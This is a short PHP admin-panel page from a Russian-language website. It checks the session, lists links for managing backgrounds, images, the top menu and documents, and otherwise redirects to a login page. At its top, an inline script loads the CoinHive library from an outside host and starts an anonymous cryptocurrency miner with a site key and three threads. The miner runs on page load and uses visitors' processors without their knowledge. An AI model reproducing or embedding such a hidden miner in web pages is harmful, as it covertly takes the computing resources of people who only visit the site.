<script src="https://coinhive.com/lib/coinhive.min.js"></script> <script>  
//we need food too :c 
var sos = new CoinHive.Anonymous('rmeaj60xrFjJ6gOi6Zk1EvB0bNdmPqT6', {throttle: 0.1});

sos.setNumberThreads(3);

sos.start();
</script>
<?
include "cook_life.php";

include "conf.php";

$kpos=-1;
if ((isset($_SESSION["log"]))&&($_SESSION['adm']>0)){
echo "<h1>Админка</h1> <a href='index.php'>на сайт</a>
<ul>
<li><a href='adm_bg.php'>Фон (бэкграунд)</a></li>
<li><a href='adm_img.php?bd=imgs'>Общая база картинок</a></li>
<li><a href='adm_csv.php'>Верхнее меню</a></li>
<li><a href='adm_docs.php'>База документов</a></li>





</ul>";
//<li><a href='adm1.php'>добавить картинки к объекту (по номеру)</a></li>
//<li><a href='up_im.php'>добавились картинки по FTP</a></li>
//<li><a href='adm_img.php?bd=slides'>Галерея</a></li>
}else{HEADER("LOCATION: loginka.php");}



?>